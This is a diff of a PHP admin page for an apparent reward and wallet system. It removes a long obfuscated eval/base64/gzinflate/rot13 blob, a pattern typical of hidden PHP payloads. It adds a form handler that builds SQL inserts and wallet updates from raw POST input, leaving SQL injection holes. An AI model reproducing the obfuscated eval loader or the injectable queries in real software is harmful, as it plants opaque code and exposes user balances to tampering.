@@ -1,6 +1,36 @@
 <?php 
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+ob_start();
+session_start();
+if($_SESSION['userid']=="")
+{
+	header("location:index.php?msg1=notauthorized");
+	exit();
+}
+	
+include ("include/connection.php");
 
+if(isset($_POST['submit'])=='Submit'){
+	$userid=($_POST['userid']);
+	$reward=($_POST['reward']);
+$sql= "INSERT INTO `tbl_reward`(`userid`,`amount`) VALUES ('".$userid."','".$reward."')";
+$query=mysqli_query($con,$sql);
+$sqlorder= mysqli_query($con,"INSERT INTO `tbl_order`(`userid`,`transactionid`,`amount`,`status`) VALUES ('".$userid."','reward','".$reward."','1')");
+@$orderid=mysqli_insert_id($con);
+
+$today = date("Y-m-d H:i:s");
+$sql3= mysqli_query($con,"INSERT INTO `tbl_walletsummery`(`userid`,`orderid`,`amount`,`type`,`actiontype`,`createdate`) VALUES ('".$userid."','".$orderid."','".$reward."','credit','reward','".$today."')");
+
+
+$walletAvailablebalance=wallet($con,'amount',$userid);	
+$finalbalanceCredit=$walletAvailablebalance+$reward;	
+$sqlwallet= mysqli_query($con,"UPDATE `tbl_wallet` SET `amount` = '$finalbalanceCredit' WHERE `userid`= '$userid'");
+if($query){
+	
+	header("location:reward_system.php?msg=updt");
+	
+	}
+
+	}
 ?>
 <!DOCTYPE html>
 <html>
